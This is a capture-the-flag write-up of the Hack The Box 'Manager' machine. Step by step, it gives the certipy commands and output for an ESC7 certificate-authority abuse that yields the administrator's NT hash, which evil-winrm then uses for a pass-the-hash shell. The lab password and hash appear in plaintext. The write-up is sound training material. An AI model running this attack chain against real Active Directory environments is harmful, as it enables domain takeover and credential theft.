# Explanation
After finding the vulnerable certificate, I decided to follow the hacktricks guide for ESC7 and I got the commands in line below. After following all the steps, I got the hash of the administrator user which is then what I used to perform pass the hash vulnerability to get access to admin account.

# rdate & timedatectl
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# rdate -n 10.10.11.236 && timedatectl set-ntp 0                                          
Wed Nov 22 08:15:50 EST 2023
 
```

# Add raven to officer
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

# Request Certificate
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 31
Would you like to save the private key? (y/N) y
[*] Saved private key to 31.key
[-] Failed to request certificate
```

# Issue Failed Certificate
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy ca -ca 'manager-DC01-CA' -issue-request 31 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'                                                    
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

# Retrieving certificate to get administrator.pfx
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 31
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 31
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '31.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

# Authenticate using administrator.pfx
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

# Access
```
┌──(root㉿kali)-[~/…/Notes/hackthebox/Manager/certificates]
└─# evil-winrm -u administrator -H 'ae5064c2f62317332c88629e025924ef' -i manager.htb                
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```